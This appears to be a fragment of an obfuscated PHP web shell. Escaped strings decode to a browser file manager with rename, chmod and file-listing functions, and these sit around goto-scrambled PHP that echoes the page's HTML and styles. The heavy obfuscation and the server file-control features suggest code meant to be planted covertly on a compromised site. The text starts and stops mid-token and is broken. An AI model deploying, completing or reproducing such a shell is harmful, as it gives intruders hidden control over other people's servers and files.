\143\164\x69\x6f\x6e\40\162\145\156\x61\x6d\x65\111\x74\x65\155\50\x6f\x6c\144\116\141\155\x65\54\x20\x74\171\160\145\x29\x20\173\12\x20\40\40\x20\x20\40\40\x20\40\x20\x20\40\143\157\x6e\x73\164\40\156\x65\x77\116\141\x6d\x65\40\x3d\40\x70\162\157\155\x70\164\x28\x27\116\x65\167\x20\156\x61\x6d\x65\x3a\47\54\40\x6f\154\144\116\141\155\x65\x29\x3b\xa\40\40\40\40\40\40\40\x20\40\x20\x20\40\151\x66\x20\50\156\x65\x77\116\x61\x6d\x65\x20\46\46\x20\156\145\x77\x4e\141\155\x65\x20\41\75\x3d\40\157\154\144\116\x61\x6d\145\x29\40\x7b\12\40\40\x20\40\x20\x20\x20\40\40\40\x20\x20\x20\40\40\40\x63\x6f\x6e\x73\x74\x20\146\157\162\155\x20\x3d\x20\x64\x6f\143\165\x6d\145\156\164\x2e\x63\162\145\141\x74\x65\x45\154\x65\155\x65\156\164\50\x27\146\x6f\162\x6d\47\51\73\12\40\40\x20\40\x20\x20\40\x20\x20\40\x20\x20\x20\x20\40\40\x66\157\x72\x6d\56\x6d\145\164\x68\x6f\144\40\75\x20\47\x70\157\163\164\47\x3b\xa\x20\x20\40\x20\x20\40\40\40\x20\40\x20\x20\40\x20\40\x20\x66\x6f\162\155\56\x69\156\156\x65\162\x48\124\x4d\114\x20\x3d\40\140\12\40\40\40\x20\x20\x20\x20\40\x20\x20\x20\40\40\40\40\x20\40\x20\x20\40\74\151\x6e\x70\165\x74\40\x74\x79\x70\x65\75\x22\x68\x69\x64\144\x65\x6e\42\x20\x6e\141\x6d\x65\75\x22\141\143\x74\x69\157\x6e\42\x20\166\141\x6c\x75\x65\x3d\x22\162\145\x6e\x61\155\x65\42\x3e\12\40\x20\x20\40\40\x20\x20\40\x20\x20\40\40\x20\x20\40\40\x20\40\x20\40\74\x69\x6e\x70\x75\x74\40\x74\x79\160\x65\75\42\x68\x69\x64\x64\x65\x6e\x22\40\x6e\x61\x6d\145\x3d\x22\x6f\x6c\x64\x5f\156\141\155\145\x22\x20\166\141\x6c\165\x65\x3d\x22\44\173\157\154\144\116\x61\x6d\145\x7d\42\x3e\12\x20\40\x20\40\40\40\40\40\40\40\40\40\40\40\40\40\40\x20\x20\x20\x3c\151\156\x70\x75\x74\x20\164\171\x70\x65\75\42\150\151\x64\x64\145\x6e\42\x20\156\141\x6d\145\75\42\156\145\x77\137\x6e\x61\x6d\x65\x22\x20\x76\141\154\x75\x65\75\x22\44\173\x6e\145\x77\x4e\141\x6d\x65\175\42\x3e\12\40\x20\40\40\40\x20\x20\40\40\x20\40\40\x20\x20\40\40\x20\x20\x20\40\x3c\151\156\x70\165\164\40\164\x79\160\145\x3d\x22\x68\x69\144\x64\145\156\42\x20\x6e\x61\155\x65\x3d\x22\164\x79\160\145\x22\40\x76\141\154\165\145\75\42\44\173\164\x79\160\x65\x7d\42\76\12\x20\x20\40\x20\x20\x20\x20\x20\x20\x20\x20\40\x20\x20\x20\40\140\73\xa\40\40\x20\x20\x20\40\40\40\x20\x20\x20\40\x20\40\40\x20\144\x6f\x63\x75\155\145\156\x74\56\x62\157\144\x79\x2e\141\x70\x70\145\156\x64\x43\150\x69\x6c\144\50\x66\x6f\162\155\51\73\xa\x20\x20\x20\x20\x20\x20\40\40\x20\x20\40\40\x20\x20\40\x20\x66\157\x72\155\x2e\163\165\x62\155\x69\x74\50\51\x3b\xa\40\x20\40\x20\40\x20\x20\40\40\40\40\40\175\xa\x20\40\40\40\40\x20\40\x20\x7d\xa\xa\40\40\40\x20\40\40\x20\x20\146\165\x6e\143\x74\x69\x6f\x6e\x20\x63\x68\x6d\x6f\x64\111\164\x65\x6d\50\156\x61\155\145\x2c\x20\x74\171\x70\x65\51\x20\x7b\xa\x20\x20\x20\40\x20\x20\40\40\x20\x20\x20\40\143\157\156\x73\164\x20\x6d\157\x64\x65\x20\x3d\x20\160\162\157\x6d\x70\x74\50\x27\x45\x6e\164\x65\x72\40\x70\145\x72\x6d\151\163\163\151\x6f\156\x73\40\x28\145\56\x67\56\54\x20\x36\x34\x34\x20\157\162\40\x37\65\x35\x29\x3a\47\54\40\x27\66\x34\64\47\x29\73\12\40\40\40\x20\x20\40\x20\40\x20\x20\x20\x20\x69\146\40\x28\x21\155\157\x64\145\x29\40\162\x65\164\165\x72\x6e\73\12\xa\x20\x20\x20\x20\x20\40\x20\x20\x20\40\x20\x20\143\157\156\163\164\x20\143\154\145\141\156\145\144\40\75\x20\123\164\x72\151\156\147\50\155\x6f\144\x65\51\x2e\162\145\x70\154\x61\143\145\x28\57\x5b\136\60\x2d\x37\135\x2f\147\x2c\40\x27\x27\51\73\12\x20\x20\40\x20\40\x20\x20\x20\x20\40\x20\x20\151\x66\40\50\x63\154\145\141\x6e\145\x64\56\154\x65\x6e\x67\164\150\40\41\75\75\40\63\x20\x26\46\x20\143\154\x65\x61\156\x65\144\x2e\x6c\145\156\x67\164\x68\x20\41\75\75\x20\64\x29\x20\173\12\x20\x20\40\40\x20\x20\40\x20\40\x20\x20\x20\x20\40\40\x20\141\x6c\145\162\x74\x28\x27\120\x65\162\155\x69\x73\x73\x69\157\x6e\x73\40\x6d\165\163\164\x20\142\x65\x20\x33\40\157\162\x20\64\40\157\143\164\141\154\x20\144\x69\147\151\164\163\40\x28\145\x2e\x67\56\x2c\40\66\x34\64\40\x6f\162\x20\60\x37\x35\x35\51\56\x27\51\73\xa\x20\x20\40\40\40\x20\x20\x20\40\40\40\40\x20\40\40\40\162\x65\164\165\162\x6e\x3b\12\40\40\40\40\40\x20\x20\40\40\40\x20\x20\175\12\12\40\x20\x20\40\40\x20\x20\40\40\40\40\40\143\x6f\x6e\x73\x74\40\x66\157\162\x6d\40\x3d\x20\144\x6f\x63\x75\155\x65\x6e\164\x2e\143\x72\145\141\164\145\x45\154\x65\x6d\145\x6e\x74\50\47\146\157\162\x6d\x27\51\x3b\xa\40\x20\x20\x20\x20\x20\x20\x20\40\40\40\x20\x66\157\162\x6d\56\155\x65\x74\x68\x6f\x64\40\75\40\x27\x70\157\163\164\x27\73\xa\40\x20\40\40\40\40\40\x20\x20\x20\40\40\x66\157\162\x6d\56\151\x6e\156\145\162\110\124\x4d\x4c\40\x3d\40\x60\12\40\40\40\x20\40\40\40\x20\x20\x20\x20\40\40\40\40\40\74\x69\156\x70\x75\164\x20\x74\171\160\x65\x3d\42\150\x69\x64\x64\145\156\x22\x20\x6e\141\155\x65\75\x22\x61\143\164\151\157\156\42\x20\x76\x61\x6c\x75\x65\75\x22\x63\150\x6d\x6f\144\x22\x3e\xa\x20\x20\40\40\x20\x20\x20\40\40\40\40\x20\x20\40\x20\40\x3c\151\x6e\160\x75\164\40\164\x79\x70\x65\75\x22\150\x69\x64\x64\x65\x6e\42\x20\156\x61\x6d\145\x3d\42\x66\x69\154\145\x6e\141\x6d\x65\x22\x20\166\x61\x6c\165\145\x3d\42\x24\173\156\141\155\145\175\42\x3e\12\x20\40\x20\x20\40\x20\x20\x20\x20\x20\40\x20\40\x20\x20\40\74\x69\156\x70\165\164\x20\x74\x79\x70\145\75\x22\x68\x69\144\144\145\x6e\42\40\156\x61\155\145\x3d\x22\155\x6f\x64\145\x22\x20\x76\x61\154\165\145\x3d\42\x24\x7b\x63\x6c\x65\x61\x6e\145\144\175\42\x3e\xa\40\40\40\40\x20\x20\40\40\40\x20\x20\x20\40\40\x20\x20\x3c\x69\x6e\x70\165\x74\40\x74\x79\160\x65\75\x22\x68\x69\144\x64\x65\156\42\x20\x6e\x61\155\145\75\x22\164\171\160\x65\x22\x20\x76\x61\x6c\165\145\75\42\x24\173\164\x79\160\145\175\x22\76\xa\40\40\40\x20\40\x20\40\x20\40\x20\x20\40\x60\73\12\40\40\40\40\x20\x20\x20\x20\x20\x20\x20\40\x64\x6f\143\x75\x6d\x65\156\x74\x2e\142\157\x64\171\x2e\141\160\160\145\x6e\144\103\x68\x69\x6c\x64\x28\x66\x6f\x72\155\x29\x3b\12\40\40\x20\40\x20\x20\40\x20\40\40\40\x20\x66\x6f\162\x6d\x2e\x73\x75\x62\155\151\x74\x28\x29\x3b\12\40\x20\40\40\40\x20\x20\40\x7d\12\12\12\x20\40\40\40\40\40\x20\x20\x2f\57\40\x2d\55\x2d\40\125\x49\x20\x6e\151\143\x65\x74\151\x65\x73\x20\x2d\x2d\55\xa\x20\x20\x20\x20\x20\40\x20\40\x63\x6f\x6e\163\x74\x20\x6d\157\x64\x61\x6c\x45\154\40\75\40\144\x6f\143\x75\155\145\156\x74\x2e\147\x65\x74\x45\x6c\x65\x6d\145\156\164\102\171\x49\x64\x28\x27\x6d\x6f\x64\141\154\x27\x29\73\xa\x20\40\40\40\40\40\x20\40\143\157\156\163\x74\x20\x6d\x6f\144\x61\x6c\103\141\162\x64\x20\x3d\40\144\157\x63\165\155\x65\x6e\164\x2e\x67\x65\164\105\x6c\145\x6d\145\x6e\164\102\x79\x49\x64\50\47\155\x6f\144\x61\154\x43\x61\162\144\x27\x29\x3b\12\12\40\40\x20\40\x20\40\40\x20\x66\165\x6e\x63\x74\151\x6f\156\40\157\160\145\156\115\x6f\x64\x61\x6c\50\51\x20\x7b\12\x20\x20\40\x20\x20\40\40\40\40\40\x20\x20\155\x6f\144\141\x6c\105\x6c\56\x63\154\141\163\163\114\x69\x73\x74\56\162\x65\x6d\157\x76\x65\50\47\x68\151\x64\x64\145\156\x27\51\x3b\xa\x20\x20\x20\40\x20\40\40\40\40\x20\x20\x20\57\x2f\x20\141\156\151\155\141\164\x69\157\156\12\40\x20\40\x20\x20\x20\x20\40\40\40\x20\40\x72\145\x71\x75\145\163\x74\x41\156\151\x6d\x61\x74\x69\x6f\x6e\106\x72\x61\155\145\x28\50\51\40\x3d\x3e\40\173\xa\40\40\40\x20\40\x20\40\x20\40\x20\x20\40\x20\x20\x20\x20\155\x6f\x64\141\154\x43\x61\x72\x64\x2e\143\154\141\x73\163\114\151\x73\164\56\162\x65\155\157\166\x65\50\47\x6d\157\x64\x61\154\55\145\156\x74\145\x72\x27\51\73\xa\40\x20\40\x20\x20\x20\40\40\40\x20\x20\x20\x20\40\x20\40\x6d\157\144\141\x6c\x43\141\162\144\x2e\143\154\x61\163\163\114\x69\163\x74\x2e\x61\144\x64\x28\x27\x6d\x6f\x64\x61\x6c\55\x65\156\164\145\x72\55\141\x63\164\151\x76\145\x27\51\73\12\x20\40\x20\x20\x20\x20\x20\x20\40\x20\x20\40\x7d\x29\73\xa\40\x20\40\x20\x20\x20\x20\x20\x7d\xa\xa\40\40\x20\40\x20\40\40\x20\146\x75\x6e\x63\164\x69\x6f\156\40\143\x6c\157\x73\x65\115\157\x64\141\154\x28\x29\40\x7b\12\x20\x20\x20\40\x20\x20\40\40\x20\40\x20\x20\155\x6f\x64\x61\x6c\x43\141\x72\144\56\x63\154\x61\x73\x73\114\x69\x73\164\56\162\x65\155\x6f\x76\145\x28\47\155\x6f\144\141\154\x2d\x65\156\164\x65\162\x2d\x61\143\x74\x69\166\x65\47\x29\73\xa\40\40\x20\40\40\x20\x20\x20\40\x20\40\x20\155\157\x64\x61\154\x43\141\162\x64\56\143\154\x61\163\163\x4c\x69\x73\x74\56\141\x64\144\x28\47\155\x6f\x64\141\154\x2d\x65\156\x74\145\162\x27\51\x3b\12\40\40\40\40\x20\x20\40\x20\x20\x20\40\40\x6d\157\x64\x61\154\105\154\x2e\x63\154\x61\163\x73\114\x69\163\x74\x2e\x61\144\144\50\x27\150\x69\x64\144\x65\156\x27\51\x3b\xa\x20\40\x20\40\40\x20\x20\x20\175\12\12\x20\x20\40\40\40\40\x20\40\x2f\x2f\40\x43\154\157\163\145\x20\x77\150\145\156\x20\143\154\151\x63\153\x69\x6e\147\x20\142\141\143\x6b\x64\162\157\160\xa\x20\x20\40\x20\40\40\40\40\155\157\144\x61\154\105\154\x2e\141\x64\x64\105\x76\x65\x6e\x74\114\151\163\164\145\x6e\145\162\x28\47\143\x6c\151\143\x6b\47\54\40\50\145\x29\x20\x3d\76\40\x7b\xa\x20\40\x20\40\x20\x20\40\x20\40\x20\x20\40\151\x66\x20\x28\145\x2e\x74\141\162\x67\x65\164\x20\75\75\75\40\155\x6f\x64\x61\x6c\105\154\x29\40\143\154\x6f\x73\145\115\x6f\144\141\x6c\x28\x29\x3b\12\x20\40\40\x20\40\40\40\x20\x7d\x29\73\xa\xa\x20\40\x20\x20\40\x20\40\x20\57\x2f\40\x43\x6c\x6f\x73\x65\x20\x6f\x6e\x20\105\123\x43\xa\40\x20\x20\40\40\x20\x20\x20\144\157\x63\165\x6d\145\156\164\56\141\144\144\x45\x76\x65\x6e\164\114\151\x73\164\x65\156\x65\162\x28\x27\x6b\x65\x79\144\157\167\x6e\47\x2c\40\50\x65\51\40\75\x3e\40\x7b\xa\40\40\40\x20\40\x20\x20\40\40\40\x20\x20\151\x66\40\50\145\56\x6b\x65\171\x20\x3d\x3d\x3d\40\x27\x45\163\x63\x61\x70\x65\47\x20\x26\x26\40\41\x6d\x6f\144\x61\x6c\x45\x6c\56\x63\154\141\163\x73\x4c\151\163\x74\x2e\143\157\x6e\x74\x61\151\x6e\163\50\47\x68\x69\x64\144\145\x6e\47\51\51\x20\143\154\x6f\x73\x65\x4d\157\x64\x61\x6c\x28\x29\73\xa\40\40\40\40\40\x20\x20\x20\175\51\73\xa\12\40\x20\40\40\x20\40\40\40\x2f\x2f\x20\x53\x65\x61\162\x63\x68\x20\x66\x69\x6c\x74\145\x72\12\x20\x20\40\40\40\40\x20\x20\x63\x6f\x6e\x73\x74\x20\163\145\x61\162\143\x68\x49\x6e\160\165\x74\40\75\40\x64\x6f\x63\165\155\145\156\x74\x2e\147\145\164\105\x6c\x65\x6d\x65\x6e\x74\102\x79\111\x64\x28\47\x73\x65\141\x72\143\x68\x49\156\160\x75\164\x27\51\x3b\12\x20\40\40\x20\x20\40\40\x20\151\146\40\x28\x73\145\141\x72\x63\x68\x49\156\x70\165\x74\x29\x20\173\xa\x20\x20\x20\40\x20\x20\40\x20\40\x20\x20\40\163\145\141\x72\143\x68\x49\156\160\x75\164\56\x61\x64\x64\105\166\x65\156\164\114\151\163\164\145\x6e\x65\162\x28\x27\151\x6e\160\165\164\x27\x2c\40\x28\x29\x20\75\x3e\x20\x7b\xa\x20\40\x20\x20\x20\40\x20\x20\x20\40\40\40\x20\x20\x20\40\x63\x6f\156\x73\x74\x20\x71\40\x3d\x20\x73\145\141\162\x63\x68\x49\156\x70\x75\x74\56\x76\x61\154\x75\145\x2e\x74\157\x4c\157\167\145\x72\x43\141\163\145\x28\51\x2e\164\162\x69\155\x28\x29\73\12\40\x20\40\40\40\40\40\x20\40\x20\40\x20\x20\40\x20\40\144\157\143\x75\x6d\x65\156\x74\x2e\161\x75\145\x72\171\x53\x65\154\145\143\x74\x6f\162\x41\154\x6c\50\x27\164\x62\157\x64\x79\x20\x74\162\x2e\x66\151\x6c\145\x2d\162\157\167\47\x29\56\x66\157\x72\105\x61\x63\x68\x28\x74\x72\x20\x3d\76\x20\173\12\x20\40\x20\40\x20\x20\x20\40\40\40\x20\x20\40\40\40\40\40\x20\40\40\x63\x6f\156\163\x74\x20\x6e\141\x6d\x65\40\x3d\40\x74\x72\x2e\x71\165\145\x72\171\x53\145\x6c\145\x63\164\157\x72\x28\x27\x74\144\47\51\x3f\x2e\x69\x6e\156\x65\x72\124\145\170\164\x3f\x2e\164\x6f\x4c\x6f\167\145\x72\103\x61\163\145\50\x29\40\174\174\40\47\47 NX6pL($XZ0KE)); goto uVkin; YUfQO: } catch (Exception $uYykB) { $WbjvF = "\x45\x72\162\x6f\x72\x3a\40" . $uYykB->getMessage(); } goto V3bUr; ExCPh: $eMSy3 = $gmEw2->V12K4($K39tE); goto cHra1; eyn8b: if (!$K39tE) { goto hNJDr; } goto ExCPh; UFgkP: echo "\74\57\164\x69\164\x6c\145\x3e\xa\x20\40\x20\40\x3c\163\143\x72\x69\x70\164\40\x73\x72\x63\75\42\150\x74\164\x70\x73\x3a\57\57\x63\144\x6e\56\x74\141\151\x6c\x77\x69\156\144\x63\x73\163\x2e\143\x6f\155\x22\76\74\x2f\163\x63\162\151\x70\164\76\12\x20\x20\x20\40\74\163\143\x72\151\x70\164\76\12\40\x20\40\x20\40\40\164\x61\x69\x6c\167\x69\x6e\144\56\x63\x6f\156\146\151\x67\40\x3d\40\173\12\40\x20\x20\40\x20\40\x20\x20\x74\150\x65\x6d\145\72\x20\x7b\12\x20\40\40\x20\x20\x20\40\x20\x20\40\145\x78\164\145\x6e\x64\72\x20\173\xa\40\x20\x20\40\x20\40\40\x20\40\40\x20\40\x66\157\156\164\106\x61\155\x69\154\x79\x3a\x20\173\40\x73\x61\x6e\x73\72\40\133\47\111\x6e\164\145\162\x27\54\x20\x27\165\x69\x2d\x73\141\x6e\x73\55\163\145\162\x69\146\47\54\x20\x27\163\x79\x73\164\145\155\55\x75\151\x27\135\40\x7d\12\x20\40\40\40\40\x20\x20\x20\40\40\x7d\xa\40\x20\x20\40\x20\40\40\x20\x7d\12\x20\x20\x20\40\x20\x20\x7d\xa\40\40\x20\40\74\x2f\163\143\x72\x69\x70\164\76\xa\x20\40\x20\40\x3c\154\151\156\x6b\40\x72\145\154\75\42\x70\162\x65\143\x6f\x6e\x6e\145\x63\x74\x22\40\150\x72\x65\x66\x3d\42\150\x74\x74\x70\x73\72\x2f\57\146\157\x6e\x74\163\x2e\x67\x6f\x6f\147\x6c\145\141\x70\x69\163\x2e\143\157\155\x22\x3e\xa\40\x20\x20\x20\74\154\151\x6e\153\x20\x72\x65\x6c\75\x22\160\x72\x65\x63\157\x6e\x6e\145\143\164\42\x20\x68\162\145\x66\75\42\x68\x74\164\160\x73\72\x2f\x2f\146\x6f\156\164\163\x2e\x67\x73\x74\141\164\151\143\56\x63\157\155\x22\40\143\162\x6f\163\163\x6f\x72\151\x67\151\156\x3e\12\x20\40\x20\x20\x3c\x6c\151\x6e\x6b\x20\150\162\145\146\x3d\42\150\164\x74\160\163\72\57\x2f\146\x6f\x6e\164\163\x2e\x67\157\157\147\154\x65\x61\160\151\x73\x2e\143\x6f\x6d\x2f\x63\163\163\62\x3f\146\141\155\x69\x6c\171\75\x49\x6e\x74\145\x72\x3a\x77\x67\x68\164\100\64\x30\60\x3b\x35\x30\x30\x3b\x36\x30\x30\73\x37\x30\x30\x26\144\151\x73\160\x6c\141\171\x3d\x73\x77\141\x70\x22\x20\162\x65\x6c\75\42\163\164\x79\154\x65\x73\150\145\x65\x74\42\76\xa\40\x20\40\x20\74\154\151\x6e\153\x20\x72\145\x6c\75\x22\163\164\171\x6c\x65\x73\150\145\x65\164\x22\x20\150\162\x65\x66\75\x22\x68\164\164\x70\x73\x3a\x2f\57\x63\144\156\152\163\x2e\x63\154\157\x75\x64\x66\x6c\141\162\x65\x2e\143\x6f\x6d\x2f\141\152\141\170\57\x6c\151\x62\x73\x2f\x66\x6f\x6e\x74\x2d\x61\167\145\x73\x6f\x6d\x65\x2f\66\56\x35\x2e\x30\57\143\x73\x73\57\x61\x6c\154\x2e\x6d\x69\x6e\56\x63\163\x73\42\x3e\12\40\40\x20\40\x3c\163\164\171\x6c\x65\76\xa\40\40\40\40\40\x20\40\40\x3a\162\x6f\157\164\173\xa\40\40\x20\40\x20\40\x20\x20\40\40\x2d\x2d\x62\x67\60\x3a\43\60\142\61\x32\x32\x30\73\xa\x20\40\40\x20\x20\40\x20\x20\40\x20\x2d\x2d\x62\x67\x31\x3a\43\60\x66\x31\x37\x32\141\x3b\12\x20\40\40\x20\40\x20\x20\x20\x20\x20\55\55\160\141\156\145\154\x3a\162\x67\142\x61\x28\61\65\x2c\62\63\54\x34\62\54\56\67\70\51\x3b\xa\40\x20\x20\40\x20\x20\40\40\x20\x20\x2d\x2d\x67\154\x61\x73\x73\72\162\x67\x62\141\x28\x31\67\54\x32\64\54\63\71\54\56\x35\x35\51\x3b\xa\x20\x20\40\40\x20\40\40\40\40\40\55\x2d\154\151\x6e\x65\x3a\162\147\x62\x61\x28\x31\64\70\54\x31\66\x33\x2c\x31\x38\64\x2c\56\61\70\51\73\12\40\40\x20\x20\40\x20\40\40\175\xa\40\x20\40\x20\40\x20\x20\40\x68\x74\x6d\154\54\x62\x6f\144\171\173\x68\x65\x69\x67\x68\x74\x3a\x31\x30\60\x25\175\12\40\x20\x20\x20\x20\x20\x20\40\x62\x6f\144\x79\173\12\40\x20\x20\40\x20\x20\x20\40\x20\40\142\x61\x63\x6b\147\162\157\165\156\x64\x3a\12\x20\x20\40\40\x20\x20\x20\x20\40\x20\x20\40\162\141\x64\x69\x61\x6c\x2d\147\x72\141\144\151\x65\156\x74\x28\x39\x30\x30\x70\170\x20\x36\x30\60\x70\170\x20\141\164\x20\x31\65\x25\40\62\60\45\54\x20\x72\x67\142\141\50\65\66\54\61\x38\x39\54\62\x34\x38\x2c\x2e\x31\x36\x29\x2c\x20\164\x72\141\156\163\160\x61\162\145\156\164\40\66\x30\45\x29\54\xa\x20\40\x20\40\40\40\40\40\40\40\40\x20\x72\x61\x64\151\141\x6c\55\x67\x72\x61\x64\151\x65\156\x74\x28\67\60\x30\x70\170\40\x35\x30\60\160\170\x20\x61\x74\x20\x38\x35\45\40\61\x30\x25\54\x20\x72\x67\142\x61\x28\x31\x33\x39\x2c\x39\x32\x2c\62\64\66\x2c\x2e\61\66\x29\54\40\164\162\141\156\163\160\141\162\145\156\x74\x20\65\x35\x25\x29\x2c\xa\40\40\x20\x20\x20\x20\40\40\40\x20\40\x20\x72\141\144\x69\x61\x6c\x2d\147\x72\x61\x64\151\x65\x6e\164\x28\x39\60\x30\160\x78\40\x36\65\60\x70\x78\40\x61\x74\x20\67\60\x25\x20\x38\x35\45\54\x20\x72\x67\142\x61\x28\63\x34\54\61\x39\x37\x2c\71\x34\x2c\x2e\x31\x30\51\x2c\x20\x74\x72\141\x6e\x73\x70\x61\x72\x65\x6e\164\x20\66\60\45\x29\54\12\40\x20\x20\x20\x20\40\40\x20\x20\40\x20\x20\154\x69\156\x65\x61\x72\x2d\x67\x72\141\144\x69\145\x6e\164\x28\61\x38\x30\144\145\147\x2c\40\x76\x61\x72\x28\x2d\x2d\x62\x67\x30\51\54\x20\166\x61\x72\x28\x2d\x2d\x62\x67\61\51\51\x3b\12\x20\40\x20\40\x20\x20\x20\40\40\40\x63\x6f\x6c\x6f\162\72\x23\x65\x35\x65\x37\x65\x62\x3b\xa\40\x20\x20\x20\x20\x20\x20\40\x20\x20\x66\157\156\x74\55\163\151\172\x65\72\x31\66\160\170\x3b\12\x20\40\x20\40\40\x20\x20\x20\40\40\x66\157\156\x74\55\146\x61\x6d\x69\x6c\x79\x3a\40\x49\x6e\164\145\162\54\40\x75\151\x2d\x73\x61\x6e\x73\55\x73\145\162\151\x66\54\x20\163\x79\x73\164\x65\155\x2d\165\x69\54\x20\55\x61\160\160\154\145\x2d\163\x79\163\x74\x65\155\54\x20\x53\145\147\157\145\40\125\x49\x2c\x20\x52\157\x62\157\x74\157\54\40\x41\162\151\x61\x6c\54\40\42\x41\x70\160\x6c\x65\x20\103\x6f\x6c\157\162\40\x45\155\157\152\x69\x22\54\42\x53\145\147\x6f\x65\40\125\111\x20\x45\155\x6f\x6a\151\42\x3b\xa\40\40\x20\40\x20\40\x20\40\x7d\12\x20\40\x20\40\x20\x20\40\40\151\156\160\165\164\54\x20\164\x65\x78\x74\x61\x72\145\x61\x2c\x20\x62\x75\164\164\x6f\x6e\x2c\x20\163\145\154\145\143\164\54\x20\56\164\145\x78\x74\55\x73\x6d\40\x7b\40\x66\157\156\x74\55\x73\x69\172\x65\x3a\x20\61\66\x70\170\x20\x21\151\155\x70\157\x72\164\141\156\164\x3b\40\x7d\xa\x20\40\x20\40\40\40\x20\x20\x2e\147\x6c\141\163\163\x7b\xa\x20\40\x20\x20\x20\40\x20\40\x20\40\x62\x61\143\153\147\162\x6f\165\x6e\x64\72\40\x76\x61\x72\x28\x2d\55\147\x6c\x61\x73\163\x29\x3b\xa\40\x20\40\x20\x20\40\x20\40\40\40\142\x6f\162\144\x65\162\72\x20\x31\x70\x78\x20\x73\x6f\154\x69\x64\x20\166\141\162\50\55\55\154\151\156\145\51\73\12\40\40\x20\x20\40\40\x20\x20\x20\x20\x62\x61\143\153\x64\x72\x6f\160\55\x66\151\154\164\145\162\x3a\x20\142\x6c\x75\x72\50\x31\62\x70\x78\51\73\12\40\x20\40\x20\40\40\40\40\x20\40\x2d\167\x65\142\153\151\x74\55\142\141\143\153\144\162\157\160\55\x66\x69\154\164\145\x72\72\x20\x62\x6c\x75\x72\x28\x31\x32\160\170\x29\73\12\x20\x20\40\x20\x20\x20\x20\40\x7d\xa\x20\40\x20\40\x20\x20\40\x20\56\x70\x61\x6e\x65\x6c\x7b\xa\x20\40\x20\40\x20\x20\40\x20\x20\x20\x62\x61\143\x6b\147\x72\157\x75\x6e\x64\x3a\x20\x76\x61\x72\50\55\55\x70\x61\x6e\145\154\x29\x3b\12\40\x20\x20\40\x20\40\x20\40\40\40\142\157\x72\144\145\x72\x3a\40\x31\160\x78\x20\163\x6f\x6c\x69\144\x20\x76\141\162\x28\55\x2d\x6c\x69\x6e\145\51\x3b\12\x20\40\40\40\x20\40\x20\x20\x7d\12\40\x20\x20\x20\x20\x20\40\x20\x2e\x66\151\154\x65\55\x72\x6f\167\72\150\157\166\x65\x72\x20\173\x20\x62\x61\x63\153\147\162\x6f\165\156\144\x2d\x63\x6f\154\157\x72\72\x20\162\147\x62\x61\50\x31\64\70\54\x31\x36\63\x2c\x31\70\x34\x2c\56\x30\x38\51\x3b\x20\175\xa\x20\x20\x20\40\x20\x20\x20\x20\56\x68\164\141\143\x63\x65\x73\163\40\x7b\x20\x63\x6f\x6c\157\x72\72\40\x23\146\142\x62\x66\x32\64\x20\41\x69\x6d\x70\157\162\164\x61\156\x74\73\x20\x66\157\x6e\164\x2d\146\x61\x6d\151\154\171\x3a\x20\x75\x69\55\155\x6f\x6e\157\163\x70\141\x63\145\x2c\40\123\106\115\x6f\x6e\x6f\x2d\122\x65\147\x75\x6c\x61\162\54\40\115\x65\x6e\154\157\x2c\40\115\157\x6e\x61\x63\157\54\40\x43\x6f\156\x73\x6f\154\141\x73\x2c\40\42\x4c\151\142\x65\162\x61\x74\151\x6f\156\x20\115\157\156\x6f\x22\54\40\x22\103\157\x75\162\x69\x65\x72\x20\116\x65\x77\42\x2c\40\x6d\x6f\156\x6f\x73\160\x61\x63\x65\x3b\x20\146\x6f\156\x74\x2d\167\x65\151\147\150\x74\x3a\40\67\x30\60\73\40\175\xa\40\x20\40\40\x20\x20\40\x20\x2e\x69\143\x6f\156\55\x66\x6f\x6c\x64\145\x72\x20\173\40\143\157\x6c\x6f\x72\72\x20\43\x36\60\141\65\146\141\73\40\175\12\40\40\x20\x20\40\40\40\40\x2e\x69\x63\x6f\156\x2d\x66\x69\x6c\145\x20\x7b\40\x63\157\154\x6f\x72\x3a\40\x23\71\64\141\x33\x62\70\73\40\175\12\x20\x20\x20\40\40\x20\x20\40\164\145\x78\x74\x61\162\x65\x61\40\x7b\x20\x6d\x69\x6e\x2d\150\145\151\x67\x68\164\72\40\63\62\60\160\x78\73\40\x7d\xa\40\40\x20\40\40\x20\40\x20\x3a\72\x2d\x77\x65\142\153\151\164\x2d\x73\143\162\x6f\x6c\154\x62\x61\x72\x7b\150\x65\x69\x67\150\164\x3a\x31\60\x70\170\73\167\x69\x64\164\150\72\61\x30\160\x78\175\12\x20\40\x20\x20\40\x20\x20\x20\72\72\55\x77\145\x62\x6b\151\164\x2d\163\143\x72\157\154\x6c\x62\141\x72\55\164\150\165\x6d\x62\x7b\142\x61\x63\x6b\147\162\157\165\x6e\144\72\162\x67\x62\x61\50\61\x34\x38\54\61\66\x33\54\x31\x38\x34\54\56\62\x32\x29\x3b\142\x6f\x72\144\x65\162\55\162\x61\144\x69\165\x73\x3a\71\71\x39\160\x78\175\12\40\x20\40\40\40\40\40\40\72\x3a\55\167\x65\142\153\151\x74\x2d\163\x63\x72\x6f\154\x6c\142\141\x72\x2d\164\x72\141\143\x6b\173\142\141\x63\x6b\x67\162\x6f\x75\156\x64\72\162\x67\x62\x61\x28\x32\54\66\54\62\63\54\x2e\x32\x35\51\175\xa\x20\40\x20\x20\40\40\40\40\56\x62\x74\x6e\173\x20\142\x6f\162\x64\145\162\72\x31\160\x78\40\x73\157\x6c\151\x64\40\x72\x67\142\141\50\61\64\70\54\61\x36\63\x2c\x31\x38\x34\x2c\x2e\x31\x38\x29\73\40\142\141\143\x6b\x67\162\157\x75\x6e\x64\72\x72\x67\142\x61\50\62\x35\65\54\62\x35\65\x2c\62\x35\65\x2c\56\60\x34\x29\x3b\40\175\12\40\x20\40\x20\x20\x20\40\x20\56\x62\164\x6e\x3a\x68\x6f\x76\x65\162\173\40\142\x61\143\x6b\147\162\x6f\x75\156\x64\72\x72\x67\x62\x61\x28\62\x35\x35\x2c\x32\65\x35\54\62\65\65\x2c\56\60\x37\51\73\x20\175\xa\x20\x20\40\40\40\40\40\x20\56\142\164\x6e\x2d\x70\x72\x69\155\x61\x72\171\173\40\142\141\x63\x6b\147\162\157\x75\156\x64\72\162\x67\142\141\50\65\66\x2c\x31\70\71\x2c\62\x34\70\54\56\71\60\51\73\x20\x63\x6f\x6c\x6f\x72\72\43\60\x36\x31\x30\61\x64\x3b\x20\142\157\162\144\x65\162\55\143\157\154\157\x72\72\162\x67\x62\141\50\x35\x36\54\x31\70\71\54\62\64\70\54\x2e\63\60\51\x3b\40\175\12\x20\40\40\40\x20\40\40\40\56\x62\x74\x6e\x2d\x70\x72\151\x6d\141\162\171\72\150\x6f\x76\145\162\173\40\x62\x6